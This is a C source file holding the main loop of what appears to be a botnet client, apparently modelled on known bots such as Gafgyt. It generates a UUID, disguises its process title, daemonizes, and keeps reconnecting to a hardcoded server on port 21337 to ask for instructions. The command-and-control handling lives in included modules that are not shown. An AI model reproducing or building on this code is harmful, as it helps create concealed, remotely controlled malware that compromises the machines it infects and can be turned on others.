/*
   created at 2015//4/9
   latest modified at 2015/4/9
   test server used by alexjlz
 */

#include "tcpip/tcpip.h"
#include "utils/utils.h"
#include "core/core.h"
#include "alg/alexjlz_hash.h"
#include "daemon/daemon.h"
#include "log/log.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int mainCommSock = 0;
char *server = SERVER;
int port = 21337;
extern char uuid[32];
extern uint32_t *pids;
extern uint32_t numpids;

int main(int argc, char **argv)
{
    alexjlz_log(1, "client started:%s\n", uuid);
    generate_uuid();
    alexjlz_log(1, "uuid generated:%s\n", uuid);
    getOurIP();
	srand(time(NULL) ^ getpid());
	init_rand(time(NULL) ^ getpid());
    set_proc_title(argc, argv, PROC_TITLE);
    alexjlz_log(1, "set proc title success\n");

    while (1)
    {
        if ( daemonize() == 0 )
            break;
        alexjlz_log(3, "daemonize failed\n");
        sleep(3);
    }
    alexjlz_log(3, "daemonize success\n");
    while ( 1 )
    {
		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
        { 
            alexjlz_log(3, "connect to server failed\n");
            sleep(5); continue; 
        }
        alexjlz_log(3, "connect to server success\n");
        if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
                                                      // and server are unexpectedly closed
        {
            //fprintf(stdout, "error in client\n");
        }
        
        if ( check_fd(mainCommSock) )
        {
            close(mainCommSock);
        }
        sleep(3);
    }

    return 0;
}
